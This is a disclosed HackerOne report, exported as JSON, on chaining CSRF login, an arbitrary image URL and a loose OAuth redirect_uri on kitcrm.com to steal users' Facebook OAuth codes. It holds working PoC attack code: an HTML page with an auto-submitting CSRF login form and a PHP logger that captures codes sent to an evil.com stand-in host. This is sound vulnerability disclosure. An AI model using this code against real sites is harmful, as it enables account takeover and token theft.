{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-03-15T21:45:59.016Z", 
    "voters": [
        "delimitry", 
        "kapytein", 
        "bogdantcaciuc", 
        "supernatural", 
        "eveeez", 
        "muhammad_uwais", 
        "mpz", 
        "xhzeem", 
        "kiraak-boy", 
        "exception", 
        "and 14 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 211477, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-03-14T21:04:13.504Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Stealing users' facebook access tokens - kitcrm.com", 
    "is_member_of_team?": null, 
    "vote_count": 24, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 3534, 
            "content": "Chaining minor bugs with no impact at all to steal facebook codes.\nMore to add here: Through this bug an attacker could steal `code` returned from facebook not the `access_token` itself.\nThe exploitation scenario I thought of was to use that code through `kitcrm.com` to access the victim's account and take advantage of granted permissions, however, after a conversation in Bug Bounty Forums turned out that facebook now requires validation for the exact `redirect_uri` used when obtaining the code (https://developers.facebook.com/docs/facebook-login/manually-build-a-login-flow#exchangecode) which makes this bug not exploitable since the `redirect_uri` used when the attacker obtained the code does not match the one the application sends to facebook server-side when obtaining the `access_token`.\n\n", 
            "content_html": "<p>Chaining minor bugs with no impact at all to steal facebook codes.<br>\nMore to add here: Through this bug an attacker could steal <code>code</code> returned from facebook not the <code>access_token</code> itself.<br>\nThe exploitation scenario I thought of was to use that code through <code>kitcrm.com</code> to access the victim&#39;s account and take advantage of granted permissions, however, after a conversation in Bug Bounty Forums turned out that facebook now requires validation for the exact <code>redirect_uri</code> used when obtaining the code (<a title=\"https://developers.facebook.com/docs/facebook-login/manually-build-a-login-flow#exchangecode\" href=\"/redirect?signature=548c59fc591943a4fec49df41dd989b848497be5&amp;url=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fmanually-build-a-login-flow%23exchangecode\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://developers.facebook.com/docs/facebook-login/manually-build-a-login-flow#exchangecode</span><i class=\"icon-external-link\"></i></a>) which makes this bug not exploitable since the <code>redirect_uri</code> used when the attacker obtained the code does not match the one the application sends to facebook server-side when obtaining the <code>access_token</code>.</p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": true, 
            "created_at": "2017-03-08T00:06:18.213Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-08T00:06:18.213Z", 
            "actor": {
                "url": "/shopify", 
                "profile": {
                    "name": "Shopify"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
                }
            }, 
            "team_handle": "shopify", 
            "message": "Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nOur team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don't worry, we'll get to yours!\n\nWhile you are waiting, you can read over our list of non applicable issues listed on our program page: https://hackerone.com/shopify. Make sure your issue isn't listed!", 
            "markdown_message": "<p>Thank you for reporting this bug! This is an automated response to let you know that we&#39;ve received your issue, and we&#39;ll process it as soon as possible.</p>\n\n<p>Our team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don&#39;t worry, we&#39;ll get to yours!</p>\n\n<p>While you are waiting, you can read over our list of non applicable issues listed on our program page: <a title=\"https://hackerone.com/shopify\" href=\"https://hackerone.com/shopify\">https://hackerone.com/shopify</a>. Make sure your issue isn&#39;t listed!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1525815, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54"
            }, 
            "created_at": "2017-03-10T00:18:13.616Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-10T00:18:13.616Z", 
            "actor": {
                "username": "hackerjuan", 
                "url": "/hackerjuan", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/072/324/b07d4ad408ec68efa0bf405fec25916aa3e1a147_medium.jpeg?1519416061"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thank you for your report!\n\nWe have added the correct callback URI to the redirection whitelist on the Kit Facebook app configuration.\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.", 
            "markdown_message": "<p>Thank you for your report!</p>\n\n<p>We have added the correct callback URI to the redirection whitelist on the Kit Facebook app configuration.<br>\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1531184, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-03-14T21:04:06.086Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-14T21:04:06.086Z", 
            "actor": {
                "url": "/shopify", 
                "profile": {
                    "name": "Shopify"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
                }
            }, 
            "team_handle": "shopify", 
            "bonus_amount": "0.0", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54"
            }, 
            "message": "Thanks for helping improve the security of Kit! ", 
            "markdown_message": "<p>Thanks for helping improve the security of Kit! </p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1541553, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-14T21:04:13.530Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-14T21:04:13.530Z", 
            "actor": {
                "username": "andrewdunbar", 
                "url": "/andrewdunbar", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1541554, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-15T04:02:40.334Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-15T14:32:53.126Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Hi can you please redact \u2588\u2588\u2588\u2588\u2588 from the report as well as removing the video attachment before disclosing this.\n\nThanks!", 
            "markdown_message": "<p>Hi can you please redact \u2588\u2588\u2588\u2588\u2588 from the report as well as removing the video attachment before disclosing this.</p>\n\n<p>Thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1542074, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-15T17:01:14.051Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-15T17:01:14.051Z", 
            "actor": {
                "username": "hackerjuan", 
                "url": "/hackerjuan", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/072/324/b07d4ad408ec68efa0bf405fec25916aa3e1a147_medium.jpeg?1519416061"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "We have removed the info as requested.", 
            "markdown_message": "<p>We have removed the info as requested.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1543397, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-15T21:45:59.036Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-15T21:45:59.036Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thanks!", 
            "markdown_message": "<p>Thanks!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1544161, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-15T21:45:59.091Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-15T21:45:59.091Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1544162, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "zombiehelp54", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/zombiehelp54", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/036/135/a1e84d9d7dd80d2da82bb4f35395578fe22ba64a_small.jpg?1534236188"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2017-03-15T21:45:59.073Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/211477", 
    "created_at": "2017-03-08T00:06:17.999Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><strong>Summary:</strong><br>\nI have found a number of minor security vulnerabilities with no impact that when chained together will lead to an attacker being able to steal the current user&#39;s facebook access token provided for kitcrm.com</p>\n\n<p><strong>Description:</strong></p>\n\n<ul>\n<li>In kitcrm.com, users register with their shopify account and the products in their store appear in <strong>Priority Products</strong> section.</li>\n<li>When a user tries to edit a priority product, the submitted request will contain the product image url as a POST parameter.</li>\n<li>Users can set their product image to anything, for example <code>http://evil.com/</code> will be accepted and added as the product image.</li>\n<li>Now each time the user visits <code>https://www.kitcrm.com/seller/onboarding/1</code>, the page will request <code>http://evil.com/</code> as an image.</li>\n<li>In <code>https://[shop].myshopify.com</code> there is no validation for the authenticity token, so there is a CSRF at the login endpoint (which has no impact at all)</li>\n<li>Users of <code>kitcrm.com</code> are authenticated automatically by visiting the endpoint <code>https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com</code> which redirects to <code>https://zh5409.myshopify.com/admin/oauth/authorize?client_id=1333a1b83ccdf7a7.....</code> then they are redirected back to <code>kitcrm.com</code> and logged in.</li>\n<li>Current <code>redirect_uri</code> configuration for Kitcrm facebook oauth application allows redirection to <code>https://www.kitcrm.com/&lt;ANYTHING&gt;</code>\n</li>\n</ul>\n\n<p>Chaining all of what I mentioned above together, here is how an attacker will be able to steal users&#39; facebook access tokens: </p>\n\n<ul>\n<li>An attacker registers a shopify store and then uses it to register a <code>kitcrm.com</code> account.</li>\n<li>After that he modifies his priority product image url to <code>https://evil.com/log_token.php</code>\n</li>\n<li>Then he tricks the victim into visiting a specially crafted HTML page that will:\n\n<ul>\n<li>CSRF login the victim into the attacker&#39;s store</li>\n<li>CSRF login the victim into <code>kitcrm.com</code> </li>\n<li>Redirect the victim to <code>https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&amp;redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&amp;response_type....</code> which will redirect him back to <code>https://www.kitcrm.com/seller/onboarding/1?code=[fb_token]</code>\n</li>\n</ul>\n</li>\n<li>After the victim is redirected from facebook to kitcrm.com, a request will be sent to <code>https://evil.com/log_token.php</code> with the user&#39;s CSRF token in the referrer header.</li>\n<li>Now the attacker can store the token at his server and use it to access the user&#39;s facebook account.</li>\n</ul>\n\n<p><strong>Proof of concept:</strong><br>\nI have created a live proof of concept that does all of that and stores the access token at <code>tokens.log</code> file. <br>\nIt can be found here: <a title=\"https://alazzazpp.com/shopify/steal.html\" href=\"/redirect?signature=96815e5b4393f4452873686c0583cff50cb83475&amp;url=https%3A%2F%2Falazzazpp.com%2Fshopify%2Fsteal.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://alazzazpp.com/shopify/steal.html</span><i class=\"icon-external-link\"></i></a> (Please note that you should allow your browser to access <code>https://alazzazpp.com</code> with https since it doesn&#39;t have a valid SSL certificate.) <br>\nAlso, here is a PoC video:<br>\n{F167006}</p>\n\n<p><strong>PoC Code:</strong></p>\n\n<blockquote>\n<p>Steal.html</p>\n</blockquote>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;script&gt;</span>\n<span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">onload</span> <span class=\"o\">=</span> <span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span> \n  <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">setTimeout</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n              <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementById</span><span class=\"p\">(</span><span class=\"s2\">&quot;token&quot;</span><span class=\"p\">).</span><span class=\"nx\">innerHTML</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;&lt;iframe src=&#39;https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com&#39;&gt;&lt;/iframe&gt;&quot;</span><span class=\"p\">;</span>   \n          <span class=\"p\">},</span> <span class=\"mi\">5000</span><span class=\"p\">);</span>\n          <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">setTimeout</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n               <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">open</span><span class=\"p\">(</span><span class=\"s1\">&#39;https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&amp;redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&amp;response_type=code&amp;scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages&#39;</span><span class=\"p\">);</span>\n          <span class=\"p\">},</span> <span class=\"mi\">10000</span><span class=\"p\">);</span>\n<span class=\"nx\">finished</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"kd\">var</span> <span class=\"nx\">xhttp</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">XMLHttpRequest</span><span class=\"p\">();</span>\n<span class=\"nx\">xhttp</span><span class=\"p\">.</span><span class=\"nx\">onreadystatechange</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">readyState</span> <span class=\"o\">==</span> <span class=\"mi\">4</span> <span class=\"o\">&amp;&amp;</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">status</span> <span class=\"o\">==</span> <span class=\"mi\">200</span> <span class=\"o\">&amp;&amp;</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">responseText</span><span class=\"p\">.</span><span class=\"nx\">length</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n     <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementById</span><span class=\"p\">(</span><span class=\"s2\">&quot;token&quot;</span><span class=\"p\">).</span><span class=\"nx\">innerHTML</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;&lt;b&gt;Your access token is: &lt;br&gt;&lt;/b&gt;&quot;</span> <span class=\"o\">+</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">responseText</span><span class=\"p\">;</span>\n     <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">responseText</span><span class=\"p\">);</span>\n     <span class=\"nx\">finished</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n   <span class=\"p\">}</span>\n <span class=\"p\">};</span>\n<span class=\"kd\">function</span> <span class=\"nx\">fetchToken</span><span class=\"p\">(){</span> \n <span class=\"nx\">xhttp</span><span class=\"p\">.</span><span class=\"nx\">open</span><span class=\"p\">(</span><span class=\"s2\">&quot;GET&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;tokens.log?&quot;</span><span class=\"o\">+</span><span class=\"nb\">Math</span><span class=\"p\">.</span><span class=\"nx\">random</span><span class=\"p\">(),</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n <span class=\"nx\">xhttp</span><span class=\"p\">.</span><span class=\"nx\">send</span><span class=\"p\">();</span>\n <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">finished</span> <span class=\"o\">==</span> <span class=\"mi\">1</span><span class=\"p\">){</span>\n   <span class=\"nx\">clearInterval</span><span class=\"p\">(</span><span class=\"nx\">interval</span><span class=\"p\">);</span>\n <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n<span class=\"kd\">var</span> <span class=\"nx\">interval</span> <span class=\"o\">=</span> <span class=\"nx\">setInterval</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span> <span class=\"nx\">fetchToken</span><span class=\"p\">()</span> <span class=\"p\">}</span> <span class=\"p\">,</span> <span class=\"mi\">10000</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;h4&gt;</span>If no window was opened click <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&amp;redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&amp;response_type=code&amp;scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages&quot;</span> <span class=\"na\">target=</span><span class=\"s\">&quot;_blank&quot;</span><span class=\"nt\">&gt;</span>here<span class=\"nt\">&lt;/a&gt;</span>: \n\n<span class=\"nt\">&lt;div</span> <span class=\"na\">id=</span><span class=\"s\">&quot;token&quot;</span><span class=\"nt\">&gt;&lt;h3&gt;</span>Your access token should appear soon.....<span class=\"nt\">&lt;/h3&gt;&lt;/div&gt;</span>\n<span class=\"nt\">&lt;iframe</span> <span class=\"na\">src=</span><span class=\"s\">&#39;data:text/html,&lt;form action=&quot;https://zh5409.myshopify.com/admin/auth/login&quot; method=&quot;post&quot;&gt;\n&lt;input name=&quot;utf8&quot; value=&quot;&quot;&gt;&lt;input name=&quot;redirect&quot;&gt;&lt;input name=&quot;highlight=&gt;&lt;input name=&quot;subdomain&quot; value=zh5409&gt;&lt;input name=&quot;login&quot; value=\u2588\u2588\u2588&gt;&lt;input name=&quot;password&quot; value=P@ss123lol&gt;&lt;input name=&quot;[remember]&quot; value=1&gt;\n&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;&#39;</span><span class=\"nt\">&gt;&lt;/iframe&gt;</span>\n<span class=\"nt\">&lt;div</span> <span class=\"na\">id=</span><span class=\"s\">&quot;csrf_login&quot;</span><span class=\"nt\">&gt;&lt;/div&gt;</span>\n</code></pre>\n<blockquote>\n<p>log_token.php</p>\n</blockquote>\n<pre class=\"highlight php\"><code><span class=\"cp\">&lt;?php</span>\n<span class=\"nb\">header</span><span class=\"p\">(</span><span class=\"s2\">&quot;Access-Control-Allow-Origin: *&quot;</span><span class=\"p\">);</span>\n<span class=\"nv\">$referrer</span> <span class=\"o\">=</span> <span class=\"nv\">$_SERVER</span><span class=\"p\">[</span><span class=\"s1\">&#39;HTTP_REFERER&#39;</span><span class=\"p\">];</span>\n<span class=\"nv\">$token</span> <span class=\"o\">=</span> <span class=\"nb\">substr</span><span class=\"p\">(</span><span class=\"nv\">$referrer</span><span class=\"p\">,</span> <span class=\"nb\">strpos</span><span class=\"p\">(</span><span class=\"nv\">$referrer</span><span class=\"p\">,</span> <span class=\"s2\">&quot;=&quot;</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">);</span>    \n<span class=\"nv\">$fp</span> <span class=\"o\">=</span> <span class=\"nb\">fopen</span><span class=\"p\">(</span><span class=\"s1\">&#39;tokens.log&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;w&#39;</span><span class=\"p\">);</span>\n<span class=\"nb\">fwrite</span><span class=\"p\">(</span><span class=\"nv\">$fp</span><span class=\"p\">,</span> <span class=\"nv\">$token</span><span class=\"o\">.</span><span class=\"s2\">&quot;</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">);</span>\n<span class=\"nb\">fclose</span><span class=\"p\">(</span><span class=\"nv\">$fp</span><span class=\"p\">);</span>\n<span class=\"cp\">?&gt;</span>\n</code></pre>\n<p><strong>Recommended fix:</strong><br>\nMitigation of this vulnerability is pretty simple, just set your facebook oauth application <code>redirect_uri</code> to the exact callback endpoint and remove the domain from the white list.</p>\n", 
    "vulnerability_information": "**Summary:**\nI have found a number of minor security vulnerabilities with no impact that when chained together will lead to an attacker being able to steal the current user's facebook access token provided for kitcrm.com\n\n**Description:**\n- In kitcrm.com, users register with their shopify account and the products in their store appear in **Priority Products** section.\n- When a user tries to edit a priority product, the submitted request will contain the product image url as a POST parameter.\n- Users can set their product image to anything, for example `http://evil.com/` will be accepted and added as the product image.\n- Now each time the user visits `https://www.kitcrm.com/seller/onboarding/1`, the page will request `http://evil.com/` as an image.\n- In `https://[shop].myshopify.com` there is no validation for the authenticity token, so there is a CSRF at the login endpoint (which has no impact at all)\n- Users of `kitcrm.com` are authenticated automatically by visiting the endpoint `https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com` which redirects to `https://zh5409.myshopify.com/admin/oauth/authorize?client_id=1333a1b83ccdf7a7.....` then they are redirected back to `kitcrm.com` and logged in.\n- Current `redirect_uri` configuration for Kitcrm facebook oauth application allows redirection to `https://www.kitcrm.com/<ANYTHING>`\n\nChaining all of what I mentioned above together, here is how an attacker will be able to steal users' facebook access tokens: \n\n- An attacker registers a shopify store and then uses it to register a `kitcrm.com` account.\n- After that he modifies his priority product image url to `https://evil.com/log_token.php`\n- Then he tricks the victim into visiting a specially crafted HTML page that will:\n   - CSRF login the victim into the attacker's store\n   - CSRF login the victim into `kitcrm.com` \n   - Redirect the victim to `https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type....` which will redirect him back to `https://www.kitcrm.com/seller/onboarding/1?code=[fb_token]`\n- After the victim is redirected from facebook to kitcrm.com, a request will be sent to `https://evil.com/log_token.php` with the user's CSRF token in the referrer header.\n- Now the attacker can store the token at his server and use it to access the user's facebook account.\n\n**Proof of concept:**\nI have created a live proof of concept that does all of that and stores the access token at `tokens.log` file. \nIt can be found here: https://alazzazpp.com/shopify/steal.html (Please note that you should allow your browser to access `https://alazzazpp.com` with https since it doesn't have a valid SSL certificate.) \nAlso, here is a PoC video:\n{F167006}\n\n**PoC Code:**\n> Steal.html\n\n```html\n<script>\nwindow.onload = function () { \n  window.setTimeout(function() {\n              document.getElementById(\"token\").innerHTML = \"<iframe src='https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com'></iframe>\";   \n          }, 5000);\n          window.setTimeout(function() {\n               window.open('https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages');\n          }, 10000);\nfinished = 0;\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\nif (this.readyState == 4 && this.status == 200 && this.responseText.length > 0) {\n     document.getElementById(\"token\").innerHTML = \"<b>Your access token is: <br></b>\" +this.responseText;\n     alert(this.responseText);\n     finished = 1;\n   }\n };\nfunction fetchToken(){ \n xhttp.open(\"GET\", \"tokens.log?\"+Math.random(), true);\n xhttp.send();\n if (finished == 1){\n   clearInterval(interval);\n }\n}\nvar interval = setInterval(function(){ fetchToken() } , 10000);\n}\n</script>\n<h4>If no window was opened click <a href=\"https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages\" target=\"_blank\">here</a>: \n\n<div id=\"token\"><h3>Your access token should appear soon.....</h3></div>\n<iframe src='data:text/html,<form action=\"https://zh5409.myshopify.com/admin/auth/login\" method=\"post\">\n<input name=\"utf8\" value=\"\"><input name=\"redirect\"><input name=\"highlight=><input name=\"subdomain\" value=zh5409><input name=\"login\" value=\u2588\u2588\u2588><input name=\"password\" value=P@ss123lol><input name=\"[remember]\" value=1>\n</form><script>document.forms[0].submit()</script>'></iframe>\n<div id=\"csrf_login\"></div>\n```\n\n> log_token.php\n\n```php\n<?php\nheader(\"Access-Control-Allow-Origin: *\");\n$referrer = $_SERVER['HTTP_REFERER'];\n$token = substr($referrer, strpos($referrer, \"=\") + 1);    \n$fp = fopen('tokens.log', 'w');\nfwrite($fp, $token.\"\\n\");\nfclose($fp);\n?>\n```\n\n**Recommended fix:**\nMitigation of this vulnerability is pretty simple, just set your facebook oauth application `redirect_uri` to the exact callback endpoint and remove the domain from the white list.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.shopify.com", 
            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
            "twitter_handle": "", 
            "name": "Shopify"
        }, 
        "handle": "shopify", 
        "url": "https://hackerone.com/shopify", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1382, 
        "default_currency": "usd"
    }, 
    "is_published": false
}